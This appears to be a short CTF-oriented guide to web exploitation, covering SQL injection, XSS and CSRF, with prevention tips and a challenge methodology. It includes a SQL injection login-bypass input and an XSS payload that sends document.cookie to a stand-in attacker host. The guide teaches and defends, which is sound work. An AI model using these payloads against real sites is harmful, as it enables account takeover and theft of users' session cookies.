# Web Exploitation Guide

This guide covers common web exploitation techniques and vulnerabilities that frequently appear in CTF challenges.

## Common Web Vulnerabilities

### SQL Injection

SQL injection occurs when user input is incorrectly filtered and directly included in SQL queries.

#### Example

```sql
# Vulnerable code
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

# Attack input
username: admin' --
```

#### Tools
- SQLmap
- Burp Suite

#### Prevention
- Use prepared statements
- Input validation and sanitization
- Least privilege database accounts

### Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

#### Types
- **Reflected XSS**: Payload is part of the request
- **Stored XSS**: Payload is stored in the database
- **DOM-based XSS**: Vulnerability exists in client-side code

#### Example Payload

```javascript
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### Cross-Site Request Forgery (CSRF)

CSRF tricks users into performing actions they didn't intend to perform.

#### Prevention
- CSRF tokens
- SameSite cookies
- Verify request origin

## Methodology for Web Challenges

1. **Reconnaissance**
   - Check the page source code
   - Look for hidden inputs, comments, or JavaScript files
   - Review cookies and local storage
   - Examine HTTP headers

2. **Mapping the Application**
   - Identify input points
   - Understand the application flow
   - Look for API endpoints
   - Directory enumeration

3. **Vulnerability Assessment**
   - Test for common vulnerabilities
   - Check for insecure configurations
   - Look for outdated components

4. **Exploitation**
   - Craft targeted payloads
   - Chain vulnerabilities when necessary
   - Document your approach
